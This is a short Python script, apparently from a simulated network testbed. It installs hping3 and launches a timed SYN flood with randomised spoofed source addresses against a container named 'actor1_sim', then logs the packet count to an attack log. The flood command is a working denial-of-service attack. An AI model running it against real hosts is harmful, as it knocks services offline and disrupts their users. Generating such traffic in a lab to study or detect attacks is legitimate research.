import time
import random
import subprocess
import signal
import re
import socket

prep_time = random.randint(5, 10)  # seconds to wait before launching attack
attack_time = random.randint(5, 10)  # duration of the attack in seconds

subprocess.run("apk update && apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing hping3", shell=True)
print(f"Waiting for {prep_time} seconds before starting SYN flood...")
time.sleep(prep_time)

print(f"Starting SYN flood attack for {attack_time} seconds...")

start = time.time()

result = socket.getaddrinfo("actor1_sim", None)
dst_ip = result[0][4][0]
result = socket.getaddrinfo(socket.gethostname(), None)
src_ip = result[0][4][0]

proc = subprocess.Popen(f"hping3 -S actor1_sim -p 443 --flood --rand-source", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
time.sleep(attack_time)

proc.send_signal(signal.SIGINT) 
stop = time.time()
length = stop - start

try:
    stdout, stderr = proc.communicate(timeout=2)
except subprocess.TimeoutExpired:
    proc.kill()
    stdout, stderr = proc.communicate()
output = stdout + stderr

num_packets = 0
m = re.search(r"([0-9]+) packets tramitted", output)
if m:
    num_packets = int(m.group(1))

log_line = f"{start},{num_packets},{src_ip},{dst_ip},SYN\n"
try:
    with open("logs/attacks.log", "a") as f:
        f.write(log_line)
except Exception as e:
    print(f"Actor1: Error writing to log file: {e}")